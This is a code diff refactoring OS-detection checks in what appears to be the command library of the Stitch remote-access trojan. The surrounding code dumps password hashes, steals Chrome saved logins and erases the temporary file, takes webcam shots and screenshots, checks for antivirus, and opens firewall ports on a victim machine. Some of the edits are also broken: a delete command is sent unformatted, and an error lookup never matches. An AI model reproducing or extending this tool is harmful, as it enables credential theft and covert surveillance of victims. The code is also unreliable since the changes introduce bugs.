@@ -104,7 +104,7 @@ class stitch_commands_library:
 
     def avscan(self):
         st_print("=== Antivirus Scan ===")
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             self.pyexec('avscan_win.py', pylib=True)
             st_print("    {}".format(self.receive()))
             st_print("    {}".format(self.receive()))
@@ -261,7 +261,7 @@ class stitch_commands_library:
                 while True:
                     port = raw_input("\nEnter the desired port: ", )
                     proto = raw_input("Enter desired type [TCP/UDP]: ", )
-                    if windows_client(self.cli_os):
+                    if find_client(self.cli_os) == 2:
                         direction = raw_input("Enter desired direction [IN/OUT]: ", )
                     correct = raw_input("\nOpen {} Port {} going {}? [Y/N]: ".format(proto, port, direction), )
                     if correct.lower().startswith('y'):
@@ -269,10 +269,10 @@ class stitch_commands_library:
             except KeyboardInterrupt:
                 print '\n'
                 return
-            if windows_client(self.cli_os):
+            if find_client(self.cli_os) == 2:
                 cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(
                     port, direction, direction, proto, port)
-            if osx_client(self.cli_os):
+            if find_client(self.cli_os) == 1:
                 cmd = "sed -i '' -e '$a\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(
                     proto, port)
             self.send(cmd)
@@ -282,7 +282,7 @@ class stitch_commands_library:
                 while True:
                     port = raw_input("\nEnter the desired port: ", )
                     proto = raw_input("Enter desired type [TCP/UDP]: ", )
-                    if windows_client(self.cli_os):
+                    if find_client(self.cli_os) == 2:
                         direction = raw_input("Enter desired direction [in/out]: ", )
                     correct = raw_input("\nClose {} Port {} going {}? [y/n]: ".format(proto, port, direction), )
                     if correct.lower().startswith('y'):
@@ -290,15 +290,15 @@ class stitch_commands_library:
             except KeyboardInterrupt:
                 print '\n'
                 return
-            if windows_client(self.cli_os):
+            if find_client(self.cli_os) == 2:
                 cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(
                     port, direction, proto, port)
-            if osx_client(self.cli_os):
+            if find_client(self.cli_os) == 1:
                 cmd = 'pfctl -sr 2>/dev/null | fgrep -v "block drop quick proto {} from any to any port = {}") | pfctl -f - '.format(
                     proto, port)
             self.send(cmd)
             st_print(self.receive())
-        elif option == "allow" and windows_client(self.cli_os):
+        elif option == "allow" and find_client(self.cli_os) == 2:
             try:
                 while True:
                     prog = raw_input("\nEnter the desired program to allow: ", )
@@ -318,7 +318,7 @@ class stitch_commands_library:
             usage_firewall()
 
     def hashdump(self):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             self.pyexec('hashdump.py', pylib=True)
             resp = self.receive()
             if no_error(resp):
@@ -327,11 +327,11 @@ class stitch_commands_library:
                 st_print(self.receive())
             else:
                 st_print(resp)
-        if osx_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 1:
             self.pyexec('hashdump.py', pylib=True)
             resp = self.receive()
             st_print(resp)
-        if linux_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 0:
             self.pyexec('hashdump.py', pylib=True)
             resp = self.receive()
             st_print(resp)
@@ -384,7 +384,7 @@ class stitch_commands_library:
             usage_hostsfile()
 
     def ifconfig(self, args):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'ipconfig {}'.format(args)
         else:
             cmd = 'ifconfig {}'.format(args)
@@ -423,7 +423,7 @@ class stitch_commands_library:
         st_print(self.receive())
 
     def ls(self, args):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'dir /a {}'.format(args)
         else:
             cmd = 'ls -alh {}'.format(args)
@@ -431,11 +431,11 @@ class stitch_commands_library:
         st_print(self.receive())
 
     def lsmod(self, args):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'driverquery {}'.format(args)
-        elif linux_client(system=self.cli_os):
+        elif find_client(system=self.cli_os) == 0:
             cmd = 'lsmod {}'.format(args)
-        elif osx_client(system=self.cli_os):
+        elif find_client(system=self.cli_os) == 1:
             cmd = 'kextstat {}'.format(args)
         self.send(cmd)
         st_print(self.receive())
@@ -461,14 +461,14 @@ class stitch_commands_library:
         st_print(self.receive())
 
     def pwd(self):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             self.send('cd')
         else:
             self.send('pwd')
         st_print(self.receive())
 
     def ps(self, args):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'tasklist {}'.format(args)
         else:
             cmd = 'ps {}'.format(args)
@@ -510,7 +510,7 @@ class stitch_commands_library:
         st_print(self.receive())
         sc = os.path.join(self.cli_temp, 'fs.jpg')
         self.download(sc)
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'del {}'.format(sc)
         else:
             cmd = 'rm -f {}'.format(sc)
@@ -523,7 +523,7 @@ class stitch_commands_library:
         st_print(self.receive())
 
     def touch(self, f_name):
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             cmd = 'if not exist {} type NUL > {}'.format(f_name, f_name)
         else:
             cmd = 'touch {}'.format(f_name)
@@ -592,11 +592,11 @@ class stitch_commands_library:
         if cam_dev:
             self.send(cam_dev)
         else:
-            if windows_client(system=self.cli_os):
+            if find_client(system=self.cli_os) == 2:
                 self.send("0")
             else:
                 self.send('st_continue')
-        if not windows_client(system=self.cli_os):
+        if not find_client(system=self.cli_os) == 2:
             upload_imgsnap = self.receive()
             if upload_imgsnap == 'upload_imgsnap':
                 shutil.copy(imagesnap, os.path.join(uploads_path, '.st_imsnp'))
@@ -607,7 +607,7 @@ class stitch_commands_library:
             st_print(resp)
             sc = os.path.join(self.cli_temp, 'wb.jpg')
             self.download(sc)
-            if windows_client(system=self.cli_os):
+            if find_client(system=self.cli_os) == 2:
                 cmd = 'del {}'.format(sc)
             else:
                 cmd = 'rm -f {}'.format(sc)
@@ -619,7 +619,7 @@ class stitch_commands_library:
     def webcamlist(self):
         self.pyexec('webcamList.py', pylib=True)
         resp = self.receive()
-        if windows_client(system=self.cli_os):
+        if find_client(system=self.cli_os) == 2:
             st_print(resp)
             if no_error(resp):
                 st_print(self.receive())
@@ -658,17 +658,19 @@ class stitch_commands_library:
         else:
             print
 
-    def chromedump(self):
-        if windows_client():
+    def chromedump(self, chrome_path=r"C:\Windows\Temp\c_log_626", del_cmd="del {}"):
+        if find_client() == 2:
             self.pyexec('chromedump.py', pylib=True)
             resp = self.receive()
             if no_error(resp):
-                if windows_client(self.cli_os):
-                    self.download('C:\\Windows\\Temp\\c_log_626')
-                    self.send('del C:\\Windows\\Temp\\c_log_626')
+                if find_client(self.cli_os) == 2:
+                    self.download(chrome_path)
+                    self.send(del_cmd.format(chrome_path))
                 else:
-                    self.download('/tmp/c_log_626')
-                    self.send('rm -f /tmp/c_log_626')
+                    chrome_path = "/tmp/c_log_626"
+                    del_cmd = "rm -f {}"
+                    self.download(chrome_path)
+                    self.send(del_cmd)
                 self.receive()
                 zip_name = "{}-c_log_626.zip".format(self.cli_user)
                 zip_loc = os.path.join(self.cli_dwld, zip_name)
@@ -694,12 +696,14 @@ class stitch_commands_library:
                         connection.close()
                         os.remove(zip_loc)
                         os.remove(chrome_path)
-                        if (e == 'database is locked'):
-                            st_print('[!] Make sure Google Chrome is not running in the background')
-                        elif (e == 'no such table: logins'):
-                            st_print('[!] Something is wrong with the database name')
-                        elif (e == 'unable to open database file'):
-                            st_print('[!] Something is wrong with the database path')
+                        possible_error_output = [
+                            ("database is locked", "[!] chrome might be running in the background, kill it"),
+                            ("no such table: logins", "[!] something is wrong with the databse name"),
+                            ("unable to open database file", "[!] something is wrong with the database path")
+                        ]
+                        for i, _ in enumerate(possible_error_output):
+                            if e == possible_error_output[i]:
+                                st_print(possible_error_output[i][1])
                         else:
                             st_print(e)
                     connection.close()
